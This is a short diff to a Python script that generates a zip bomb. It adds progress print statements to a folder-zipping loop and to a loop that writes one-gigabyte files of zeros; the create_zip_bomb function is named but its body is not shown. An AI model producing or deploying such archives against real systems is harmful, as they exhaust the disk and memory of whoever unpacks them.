@@ -6,8 +6,11 @@ import os
 
 def zipdir(path, ziph):
     # ziph is zipfile handle
+    count = 0
     for root, dirs, files in os.walk(path):
         for file in files:
+            count += 1
+            print("zipping file: ", os.path.join(root, file), "(", count, "/", len(files), ")")
             ziph.write(os.path.join(root, file), 
                        os.path.relpath(os.path.join(root, file), 
                                        os.path.join(path, '..')))
@@ -23,6 +26,7 @@ def create_dummy_file(dummy_filename="dummy.txt", size=1):
 
     for i in range(size):
         with open( "./temp/" + str(i) + dummy_filename, "w") as f:
+            print("writing to file: ", i+1, "/", size)
             f.write("0" * 1024*1024*1024)
 
 def create_zip_bomb(dummy_filename="dummy.txt", size=1, zip_filename="bomb.zip"):
